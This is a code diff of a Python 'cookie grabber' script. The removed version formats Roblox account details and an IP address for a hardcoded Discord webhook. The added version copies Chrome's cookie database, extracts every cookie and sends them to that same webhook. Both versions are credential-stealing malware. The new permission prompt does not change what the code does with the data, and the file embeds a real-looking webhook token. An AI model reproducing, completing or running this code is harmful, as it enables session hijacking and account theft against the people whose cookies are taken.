@@ -1,80 +1,110 @@
-import httpx
-import json
 import os
-import sys
+import sqlite3
+import shutil
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import base64
-import time
-from Crypto.Cipher import AES
-from requests import post
+import requests
 
-# Replace this with your Discord webhook URL
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp"
+# Helper function to ask for permission
+def ask_permission(permission_type):
+    print(f"Do you allow the script to access {permission_type}? (y/n): ")
+    user_input = input().strip().lower()
+    return user_input == 'y'
 
-def post_to_discord(username, avatar_url, headshot, roblox_profile, rolimons, username_value, robux, premium_status, creation_date, rap, friends, age, ip_address):
-    discord_data = {
-        "username": "BOT - Pirate 🏴‍☠️",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
+# Function to decrypt Chrome's encrypted cookies (Windows example)
+def decrypt_cookie(encrypted_value):
+    # Decrypts Chrome cookies encrypted with Windows DPAPI (Data Protection API)
+    # This is a placeholder for actual decryption, it needs to be implemented
+    # based on Windows security API, which may require specific libraries like pywin32.
+    try:
+        # You would use `win32crypt` here for actual decryption in Windows
+        # Example: win32crypt.CryptUnprotectData(encrypted_value)[1]
+        return encrypted_value  # Returning the encrypted cookie as is for now
+    except Exception as e:
+        print(f"Error decrypting cookie: {e}")
+        return encrypted_value
+
+# Function to get cookies from Chrome's cookie store (Windows)
+def get_chrome_cookies():
+    cookie_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
+
+    if not os.path.exists(cookie_db_path):
+        print("Cookies database not found!")
+        return None
+
+    # Create a temporary copy of the Cookies database since it is in use by Chrome
+    temp_cookie_db = "temp_cookies.db"
+    shutil.copy2(cookie_db_path, temp_cookie_db)
+
+    # Connect to the copied SQLite database
+    conn = sqlite3.connect(temp_cookie_db)
+    cursor = conn.cursor()
+
+    # Query to get cookies from the 'cookies' table
+    cursor.execute("SELECT name, value, host_key, path, is_secure, expires_utc FROM cookies")
+    cookies = cursor.fetchall()
+
+    # Decrypt and format cookies
+    decrypted_cookies = []
+    for cookie in cookies:
+        cookie_name, cookie_value, host_key, path, is_secure, expires_utc = cookie
+        decrypted_cookie = {
+            "name": cookie_name,
+            "value": decrypt_cookie(cookie_value) if "encrypted" in cookie_value else cookie_value,
+            "host": host_key,
+            "path": path,
+            "secure": is_secure
+        }
+        decrypted_cookies.append(decrypted_cookie)
+
+    # Clean up and remove the temporary database file
+    conn.close()
+    os.remove(temp_cookie_db)
+
+    return decrypted_cookies
+
+# Main function to handle cookie access flow
+def access_cookies():
+    if ask_permission("cookies from your browser"):
+        print("Accessing browser cookies...")
+        cookies = get_chrome_cookies()
+        if cookies:
+            print(f"Extracted cookies: {cookies}")
+            # You can now send the cookies to your Discord Webhook or use them further
+            send_cookies_to_webhook(cookies)
+        else:
+            print("No cookies found or failed to extract.")
+    else:
+        print("Permission denied. Exiting cookie extraction.")
+
+# Function to send extracted cookies to a Discord Webhook
+def send_cookies_to_webhook(cookies):
+    webhook_url = 'https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp'  # Your Discord webhook URL
+
+    # Prepare the payload with cookie information
+    data = {
+        "content": "Here are the extracted browser cookies:",
         "embeds": [
             {
-                "title": "💥 +1 Result Account 📱",
-                "thumbnail": {"url": headshot},
-                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-                "fields": [
-                    {"name": "Username", "value": f"```{username_value}```", "inline": True},
-                    {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
-                    {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
-                    {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
-                    {"name": "RAP", "value": f"```{rap}```", "inline": True},
-                    {"name": "Friends", "value": f"```{friends}```", "inline": True},
-                    {"name": "Account Age", "value": f"```{age}```", "inline": True},
-                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
-                ]
+                "title": "Extracted Cookies",
+                "description": "List of cookies extracted from Chrome:",
+                "fields": [{"name": cookie["name"], "value": cookie["value"]} for cookie in cookies],
+                "footer": {"text": "Cookie extraction bot"}
             }
         ]
     }
-    post(DISCORD_WEBHOOK_URL, json=discord_data)
 
-def extract_cookies():
-    # Implement logic to extract cookies from your system (if applicable).
-    # Example function, customize as necessary
-    cookies = {}
-    return cookies
+    headers = {
+        'Content-Type': 'application/json'
+    }
 
-def refresh_cookie(auth_cookie):
-    csrf_token = generate_csrf_token(auth_cookie)
-    cookie = {'csrf_token': csrf_token}
-    return cookie
+    # Send the data to the Discord webhook
+    response = requests.post(webhook_url, json=data, headers=headers)
 
-def generate_csrf_token(auth_cookie):
-    csrf_req = httpx.get("https://example.com", cookies=auth_cookie)
-    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
-    return csrf_txt
-
-def CookieLog():
-    # This can be used for logging cookies
-    try:
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Roblox", "Cookies")
-    except KeyError:
-        db_path = "/opt/render/project/src/Cookies"  # Fallback path for non-Windows
-    # Add logic to read from db_path
-    return None
+    if response.status_code == 200:
+        print("Cookies successfully sent to webhook!")
+    else:
+        print(f"Failed to send cookies. HTTP Status Code: {response.status_code}")
 
 if __name__ == "__main__":
-    try:
-        # Example values, replace with actual values
-        username_value = "user123"
-        robux = "1000"
-        premium_status = "True"
-        creation_date = "2022-01-01"
-        rap = "500"
-        friends = "50"
-        age = "3"
-        ip_address = "192.168.1.1"
-        headshot = "https://www.roblox.com/headshot.png"
-        roblox_profile = "https://roblox.com/user123"
-        rolimons = "https://rolimons.com/user123"
-        
-        post_to_discord(username_value, "https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
-                        headshot, roblox_profile, rolimons, username_value, robux, premium_status, creation_date, rap, friends, age, ip_address)
-    except Exception as e:
-        print(f"Error: {e}")
+    access_cookies()
